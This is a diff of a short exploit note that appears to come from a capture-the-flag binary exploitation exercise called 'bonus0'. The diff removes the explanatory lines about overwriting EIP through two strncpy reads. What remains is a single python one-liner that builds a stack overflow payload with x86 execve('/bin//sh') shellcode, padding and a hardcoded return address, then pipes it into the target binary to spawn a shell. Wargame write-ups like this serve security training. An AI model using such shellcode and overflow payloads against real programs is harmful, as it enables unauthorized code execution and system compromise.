@@ -1,9 +1,1 @@
-
-replace buffer with shellcode with 1st read, strncpy
-
-override eip with address of buffer with 2nd read , strncpy
-
-=> end of main: go to address of buffer
-	=> execute shellcode
-
 python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0' + 'a' * 4075 + '\n' + '\x0b\xcd\x80' + 'G' * 2 + 'AAAA' + '\xd6\xf6\xff\xbf' + 'DUMM' + '\xad\xde\xfe\xbe' + '\n'" > /tmp/ok && cat  /tmp/ok - | ./bonus0
